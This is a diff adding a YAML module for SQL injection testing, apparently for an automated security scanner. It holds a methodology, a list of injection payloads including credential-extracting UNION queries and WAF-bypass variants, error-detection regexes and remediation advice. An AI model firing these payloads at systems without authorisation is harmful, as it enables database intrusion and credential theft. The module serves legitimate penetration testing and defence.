@@ -1,0 +1,80 @@
+name: SQL Injection
+category: web
+description: >
+  Detects and exploits SQL injection vulnerabilities in web applications.
+  Covers in-band, blind (boolean/time-based), and out-of-band techniques.
+
+severity_range: ["MEDIUM", "HIGH", "CRITICAL"]
+tools: ["sqlmap", "custom_payloads", "curl"]
+
+methodology:
+  - "Identify all user-controllable input points (params, headers, cookies, body)"
+  - "Test for error-based injection with single quote, double quote, and special chars"
+  - "Test boolean-based blind: AND 1=1 vs AND 1=2 and compare responses"
+  - "Test time-based blind: SLEEP(5), WAITFOR DELAY, pg_sleep(5)"
+  - "Test UNION-based injection with ORDER BY to determine column count"
+  - "Test second-order injection via stored data that's later used in queries"
+  - "Check HTTP headers for injection: X-Forwarded-For, Referer, User-Agent"
+  - "Test JSON and XML parameters for injection"
+  - "Verify findings with multiple payloads and response analysis"
+  - "Document reproduction steps with exact requests"
+
+payloads:
+  # Error-based
+  - "'"
+  - "\""
+  - "' OR '1'='1"
+  - "' OR 1=1--"
+  - "' UNION SELECT NULL--"
+  - "1' ORDER BY 100--"
+  # Boolean-based blind
+  - "' AND 1=1--"
+  - "' AND 1=2--"
+  - "' OR 1=1--"
+  - "' OR 1=2--"
+  # Time-based blind
+  - "' AND SLEEP(5)--"
+  - "'; WAITFOR DELAY '0:0:5'--"
+  - "' AND pg_sleep(5)--"
+  - "1; SELECT SLEEP(5)"
+  # UNION-based
+  - "' UNION SELECT NULL,NULL,NULL--"
+  - "' UNION ALL SELECT 1,2,3--"
+  - "-1 UNION SELECT username,password FROM users--"
+  # WAF bypass
+  - "' /*!UNION*/ /*!SELECT*/ 1,2,3--"
+  - "' %55NION %53ELECT 1,2,3--"
+  - "' uni/**/on sel/**/ect 1,2,3--"
+
+detection_patterns:
+  - "(?i)(sql syntax|mysql_fetch|ORA-\\d{5}|PostgreSQL|sqlite3\\.OperationalError)"
+  - "(?i)(unclosed quotation mark|syntax error in SQL|unexpected end of SQL)"
+  - "(?i)(Warning.*mysql|Microsoft OLE DB|ODBC SQL Server|JET Database Engine)"
+  - "(?i)(You have an error in your SQL|pg_query\\(|pg_exec\\()"
+  - "(?i)(SQLSTATE|Division by zero in|supplied argument is not a valid)"
+
+remediation: >
+  Use parameterized queries (prepared statements) for ALL database interactions.
+  Never concatenate user input into SQL strings. Implement input validation
+  as defense-in-depth (not primary defense). Use ORM where possible.
+  Apply least-privilege database accounts. Enable WAF as additional layer.
+
+references:
+  - "CWE-89: Improper Neutralization of Special Elements used in an SQL Command"
+  - "OWASP A03:2021 – Injection"
+  - "OWASP Testing Guide: SQL Injection"
+  - "PortSwigger SQL Injection"
+
+triggers:
+  - "sql"
+  - "mysql"
+  - "postgresql"
+  - "mssql"
+  - "oracle"
+  - "sqlite"
+  - "database"
+  - "query"
+  - "login"
+  - "search"
+  - "filter"
+  - "api"
